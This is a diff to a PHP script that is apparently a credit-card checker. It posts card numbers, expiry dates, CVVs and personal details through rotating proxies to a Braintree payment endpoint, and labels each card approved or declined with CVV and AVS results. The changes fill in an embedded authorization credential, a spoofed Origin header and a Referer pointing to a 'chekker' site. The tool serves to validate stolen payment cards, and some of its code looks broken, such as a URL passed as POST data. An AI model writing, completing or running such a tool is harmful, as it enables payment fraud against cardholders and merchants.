@@ -188,13 +188,13 @@ curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS, ' Add post field');
 //// Short codes $cc $mes $ano $cvv $firstname $lastname $street $zip $phone $state $email/////////////////////
 $headers = array();
-$headers[] = 'Accept: ';
-$headers[] = 'Authorization: ';
-$headers[] = 'Accept-language: ';
-$headers[] = 'Braintree-version: ';
-$headers[] = 'Content-Type: ';
-$headers[] = 'Origin: ';
-$headers[] = 'Referer: ';
+$headers[] = 'Accept: */*';
+$headers[] = 'Authorization: Basic Mjg0djczeWh2enMzODNuaA== ';
+$headers[] = 'Accept-language: * ';
+$headers[] = 'Braintree-version: 2020-11-28 ';
+$headers[] = 'Content-Type: application/json ';
+$headers[] = 'Origin: https://www.google.com/ ';
+$headers[] = 'Referer: https://dumbslutvcchekker.ninja ';
 $headers[] = 'Sec-Fetch-Mode: cors';
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 
@@ -212,15 +212,16 @@ curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
 curl_setopt($ch, CURLOPT_URL, '#######################');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'Add post field');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'POST https://payments.sandbox.braintree-api.com/graphql');
 //// Short codes $cc $mes $ano $cvv $firstname $lastname $street $zip $phone $state $email/////////////////////
 $headers = array();
-$headers[] = 'Accept: ';
-$headers[] = 'Authorization: ';
-$headers[] = 'Host: ';
-$headers[] = 'Content-Type: ';
-$headers[] = 'Origin: ';
-$headers[] = 'Referer: ';
+$headers[] = 'Accept: */*';
+$headers[] = 'Authorization: Basic Mjg0djczeWh2enMzODNuaA== ';
+$headers[] = 'Accept-language: * ';
+$headers[] = 'Braintree-version: 2020-11-28 ';
+$headers[] = 'Content-Type: application/json ';
+$headers[] = 'Origin: https://www.google.com/ ';
+$headers[] = 'Referer: https://dumbslutvcchekker.ninja ';
 $headers[] = 'Sec-Fetch-Mode: cors';
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 
@@ -231,10 +232,10 @@ $avs = trim(strip_tags(getStr($result,'"avs_result":{"code":"','"')));
 ///////////////////////////////////////////////////=========[Responses]
 
 if(strpos($result, 'M')) {
-  echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ⍋</i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>Authorized [CVV-$message/AVS-$avs]</i></font><br>";
+  echo "<font size=2 color='white'><font class='badge badge-success'>APPROVED</i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>Authorized [CVV-$message/AVS-$avs]</i></font><br>";
 } 
 else {
-  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ⍋</i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>Declined [CVV-$message/AVS-$avs]</i></font><br>";
+  echo "<font size=2 color='white'><font class='badge badge-danger'>DECLINED</i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>Declined [CVV-$message/AVS-$avs]</i></font><br>";
 } 
 
 curl_close($ch);
